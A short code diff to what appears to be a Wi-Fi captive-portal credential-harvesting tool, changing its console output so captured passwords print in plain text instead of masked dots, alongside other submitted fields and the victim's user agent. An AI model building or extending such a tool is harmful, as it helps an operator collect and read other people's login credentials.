@@ -236,7 +236,7 @@ class CaptivePortalHandler(http.server.SimpleHTTPRequestHandler):
         for key, value in credentials.items():
             label = key.capitalize()
             if key == 'password':
-                print(f"{WHITE}  {label}:{NC}  {YELLOW}{'•' * len(value)}{NC}")
+                print(f"{WHITE}  {label}:{NC}  {YELLOW}{value}{NC}")
             else:
                 print(f"{WHITE}  {label}:{NC}  {YELLOW}{value}{NC}")
         print(f"{WHITE}  User Agent:{NC} {user_agent[:60]}")
